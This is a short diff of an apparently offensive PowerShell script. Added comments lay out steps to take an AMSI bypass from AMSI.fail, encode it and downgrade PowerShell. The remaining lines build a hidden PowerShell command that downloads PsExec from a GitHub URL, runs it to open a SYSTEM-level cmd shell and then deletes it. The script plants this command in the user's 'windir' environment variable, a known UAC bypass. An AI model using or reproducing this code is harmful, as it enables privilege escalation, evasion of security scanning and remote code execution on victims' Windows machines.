@@ -1,3 +1,10 @@
+#Go to AMSI.fail
+#Grab a payload 
+#Encode your AMSI bypass & script
+#downgrade powershell
+#run
+
+
 $program = "powershell.exe -WindowStyle Hidden wget 'https://github.com/b4ck3nd-dev/DuckyWare/blob/main/PsExec.exe?raw=true' -OutFile psexec.exe; .\psexec.exe -s -i cmd.exe; rm psexec.exe; exit; #"
 Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value $program -Force
 #For x64 shell in Windows x64:
